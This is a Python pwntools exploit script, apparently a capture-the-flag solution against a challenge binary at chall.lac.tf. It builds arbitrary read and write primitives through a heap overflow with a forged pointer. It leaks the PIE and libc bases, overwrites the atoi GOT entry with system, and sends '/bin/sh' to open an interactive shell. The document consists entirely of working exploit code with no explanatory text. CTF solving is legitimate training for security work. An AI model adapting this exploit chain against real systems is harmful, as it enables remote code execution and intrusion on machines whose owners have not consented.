#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31338)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

def create(idx: int):
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())

def edit(data: bytes):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"data: ", data)

def read() -> bytes:
    r.sendlineafter(b"Choice: ", b"3")
    r.recvuntil(b"data: ")
    return r.recvline()

def explore(idx: int):
    r.sendlineafter(b"Choice: ", b"4")
    r.sendlineafter(b"index: ", str(idx).encode())

def reset():
    r.sendlineafter(b"Choice: ", b"5")

def arb_write(addr: int, data: bytes):
    create(0)
    create(1)
    explore(0)

    edit(b"A" * 0x38 + p64(addr - 0x40))
    reset()

    explore(1)
    explore(1)
    edit(data)
    reset()

def arb_read(addr: int) -> bytes:
    create(0)
    create(1)
    explore(0)

    edit(b"A" * 0x38 + p64(addr - 0x40))
    reset()

    explore(1)
    explore(1)
    res = read()
    reset()
    return res

r.recvuntil(b"gift: ")
exe.address = int(r.recvline().strip(), 16) - exe.sym.main
log.info(f"{hex(exe.address)=}")

libc.address = u64(arb_read(exe.got.printf)[:8]) - libc.sym.printf
log.info(f"{hex(libc.address)=}")

# GOT overwrite
arb_write(exe.got.atoi, p64(libc.sym.system))

r.sendlineafter(b"Choice: ", b"/bin/sh")

r.interactive()

